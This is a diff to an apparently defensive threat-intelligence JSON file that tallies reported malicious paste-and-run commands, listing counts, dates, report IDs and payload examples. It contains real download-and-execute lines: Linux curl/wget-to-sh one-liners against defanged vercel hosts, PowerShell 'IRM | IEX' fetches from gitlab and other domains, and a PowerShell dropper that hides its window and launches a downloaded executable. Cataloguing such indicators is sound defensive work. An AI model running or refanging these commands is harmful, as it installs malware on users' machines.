@@ -553,12 +553,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 58,
-    "ReportCount": 58,
-    "FirstSeen": "2026-11-15T04:01:54.634000+00:00",
+    "DistinctPayloadCount": 57,
+    "ReportCount": 57,
+    "FirstSeen": "2026-11-15T09:30:34.966000+00:00",
     "LastSeen": "2026-11-21T18:09:20.081000+00:00",
     "ReportIds": [
-      "cmwhb5rpu0ryt0omlc0rks6ff",
       "cmwhmwg110tch0omlhhoi42we",
       "cmwhuqa3y0ubu0oml2z1942tq",
       "cmwipwsdv10xe0omlkv9fh7jh",
@@ -641,7 +640,6 @@
       "curl -sL -d \"id=6528680d-2714-4d9e-aaab-2728dc21f9cb&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgpsprecisions[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A57%3A38.417Z&lastShellAt=2026-11-18T04%3A57%3A38.417Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=666bb4f9-1153-4b84-85eb-86d006c06f2c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdouble-fix[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A58%3A57.107Z&lastShellAt=2026-11-18T04%3A58%3A57.107Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=68c16921-fce2-4fd4-9c9e-65ab78e2c80a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Foryxland.com.qa%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A48%3A51.563Z&lastShellAt=2026-11-16T04%3A48%3A51.563Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=69e0a4a8-9f08-4dce-8d93-b961c0037dfd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fconferenciahertz[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T04%3A00%3A19.375Z&lastShellAt=2026-11-15T04%3A00%3A19.375Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=7548974b-6da6-4fd0-ae79-b062e0be1fb7&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]thebeatofibiza[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T04%3A35%3A23.343Z&lastShellAt=2026-11-16T04%3A35%3A23.343Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=78901a54-49cb-4af8-aedb-d29b3dd32dd6&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkblandscapedesignandfinegardening[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T05%3A08%3A36.936Z&lastShellAt=2026-11-16T05%3A08%3A36.936Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=797da23a-d6ff-412b-a4bf-aaf3610132c2&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]sparkinnovationmarketing[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T15%3A19%3A30.050Z&lastShellAt=2026-11-18T15%3A19%3A30.050Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -747,10 +745,10 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 10,
-    "ReportCount": 66,
+    "DistinctPayloadCount": 11,
+    "ReportCount": 67,
     "FirstSeen": "2026-11-15T06:18:04.273000+00:00",
-    "LastSeen": "2026-11-21T18:06:17.689000+00:00",
+    "LastSeen": "2026-11-22T04:08:39.055000+00:00",
     "ReportIds": [
       "cmwhg0vgy0srr0oml60uxbl89",
       "cmwhgwtfi0stz0omlcnpm3c3e",
@@ -817,7 +815,8 @@
       "cmwqceopr262s0omlc6bhnuqe",
       "cmwqi7z1226q00omljdxusk2n",
       "cmwqpxsxb27nq0oml2sxi5qsj",
-      "cmwqpyrka27pi0oml5ef1qp1r"
+      "cmwqpyrka27pi0oml5ef1qp1r",
+      "cmwrbhefp2hzv0omlbe37fsqt"
     ],
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
@@ -828,6 +827,7 @@
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/7f1bafa-a7c5-477b-a7e3-4f9dbab46292/-/raw/main/58C-4dC67f645812 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/cd459154-52c3-4436-9b70-b7b0b3a5c110/-/raw/main/cd459154-52c3-4436-9b70-b7b0b3a5c110 | IEX",
+      "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/abba73a-484e-4a80-bc53-401c1e95160d/-/raw/main/ac9eDc0-d13C-422f-8cfC-9F91441BfAb2 | IEX",
       "IRM xlfsgudhiaokbioa[.]sisterleveling[.]com/1b60ae7b-21f3-4d74-bb56-138bf4f4620b/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX"
     ]
@@ -928,9 +928,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 21,
+    "ReportCount": 22,
     "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
-    "LastSeen": "2026-11-22T03:59:57.236000+00:00",
+    "LastSeen": "2026-11-22T04:09:27.365000+00:00",
     "ReportIds": [
       "cmwpq1rz623xv0oml9b7ckyzg",
       "cmwpvtv3x24da0omlegqyi3w3",
@@ -952,7 +952,8 @@
       "cmwrab7xy2goc0omljjalxr0i",
       "cmwrafsk02grn0oml54yr36kr",
       "cmwraz0602hii0omlahtxfh9f",
-      "cmwrb67si2hnn0omlufkmo0iy"
+      "cmwrb67si2hnn0omlufkmo0iy",
+      "cmwrbifoz2i5h0omlmy0vlkor"
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
